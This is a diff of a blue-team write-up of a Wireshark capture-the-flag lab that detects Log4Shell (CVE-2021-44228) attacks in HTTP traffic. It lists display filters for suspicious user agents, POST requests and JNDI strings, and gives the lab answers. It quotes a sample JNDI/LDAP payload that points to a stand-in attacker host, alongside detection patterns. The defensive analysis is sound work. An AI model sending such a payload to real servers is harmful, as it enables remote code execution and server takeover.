@@ -77,7 +77,7 @@ User Agent Analysis
 |Payload Data In User Agent Field|`http.user_agent contains "${" or http.user_agent contains "() {" or http.user_agent contains "/bin/bash"`|
 
 - `"${"` <--- is a marker for the Log4shell vulnerability that affected the Java logging library, Log4j.
-	- Used ti trigger a JNDI "Java Naming and Directory Interface" Lookup
+	- Used to trigger a JNDI "Java Naming and Directory Interface" Lookup
     - Java Naming and Directory Interface: A way for a program to find and lookup data or objects from an external source (database or server) `${jndi:ldap://attacker.com/Exploit}`
 - RedFlags in JDNI lookups (attacker is attempting to perform REMOTE CODE EXECUTION "RCE" - tryig to take full control of the server by forcing it to "look up" and run their malicious codes)
 	- LDAP `ldap://`: Lightweight Directory Access Protocol (Most Common in attakcs)
@@ -90,16 +90,26 @@ User Agent Analysis
   
 Log4j Analysis 
 ---
+**Log4j**
+- Is a open-source logging library written in Java.
+- Allows software developers to log various data within their applications.
 
-|                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                 |
-| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Notes                                                                                                                                                                                           | Wireshark Filters                                                                                                                                                                                                                                               |
-| Research outcomes for grabbing the low-hanging fruits: <br><br>- The attack starts with a "POST" request <br>    <br><br>- There are known cleartext patterns: "jndi:ldap" and "Exploit.class". | - http.request.method == "POST" <br>    <br><br>- (ip contains "jndi") or ( ip contains "Exploit") <br>    <br><br>- (frame contains "jndi") or ( frame contains "Exploit") <br>    <br><br>- (http.user_agent contains "$") or (http.user_agent contains "==") |
+**Log4Shell (CVE-2021-44228)**
+- vulnerability that allows Remote Code Execution (RCE).
+- An attaacker can send a specially crafted string containing a JNDI "Java Naming and Directory Interface" reference such as --->`${jndi:ldap://attacker.com/Exploit}`
+
+|	|	|
+|---|---|
+|**Notes**|**Wireshark**|
+|Identify The Initial Attack Vector via HTTP POST Requests|`http.request.method == "POST"`|
+|Search JDNI or Exploit Strings Within The IP Packet Payload|`(ip contains "jndi") or (ip contains "Exploit")`|
+|Broad Search For Cleartext Exploit Patterns Within The Entire Frame|`(frame contains "jndi") or (frame contains "Exploit")`|
+|Detect Suspicious User-Agent Strings With Log4j Syntax ($) or Base64 padding (==)|`(http.user_agent  contains "$") or (http.user__agent contains "==")`|
 
 1. **Investigate the user agents. What is the number of anomalous “user-agent” types?** 
-- To determine the number of user agents in the traffic, we can use the filter *http.user_agent* <--- this will filter out the user_agents only. 
+- To determine the number of user agents in the traffic, we can use the filter `http.user_agent` <--- this will filter out the user_agents only. 
 - Next, we need to manually go through the packets to determine how many user agents there are in total. 
-    ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/87.png) 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/87.png) 
 
 Answer: 6  
 
@@ -112,16 +122,16 @@ Answer: 6  
     
 2. **What is the packet number with a subtle spelling difference in the user agent field?**  
 - This requires us to comb through the packets to identify the spelling difference.  
-    ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/88.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/88.png)
 
 3. **Locate the “Log4j” attack starting phase. What is the packet number?**
 - Attacks from adversary usually starts with a POST  
-- We could use the filter *“http.request.method == POST*”, however that will most likely generate a lot of POST traffic 
-- Instead of using the POST filter we can use a user_agent filter such as * $ * or *http.user_agent contains “== “* <--- this is filter for traffic with user agent that contains the dollar sign “$” which signals for command injections or double equal sign “ == ” which are typically at the end of a based64 encoded string.  
-    ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/89.png)
+- We could use the filter `http.request.method == POST`, however that will most likely generate a lot of POST traffic 
+- Instead of using the POST filter we can use a user_agent filter such as `$` or `http.user_agent contains “== “` <--- this is filter for traffic with user agent that contains the dollar sign `$` which signals for command injections or double equal sign `“ == ”` which are typically at the end of a based64 encoded string.  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/89.png)
 
 4. Locate the Log4j attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Defang the IP Address)
 - Since we already identified the starting point in question 3, we just must decode the base64 encoded characters.  
--  We can use cyberchef or copy the base64 and save it as a file and use the ubuntu terminal to decode the base64 and save the file.  
-	![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/90.png)
+-  We can use cyberchef or copy the base64 and save it as a file and use the ubuntu terminal to decode the base64 and save the file.
+ ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/90.png)
 	Answer: 62[.]210[.]130[.]250
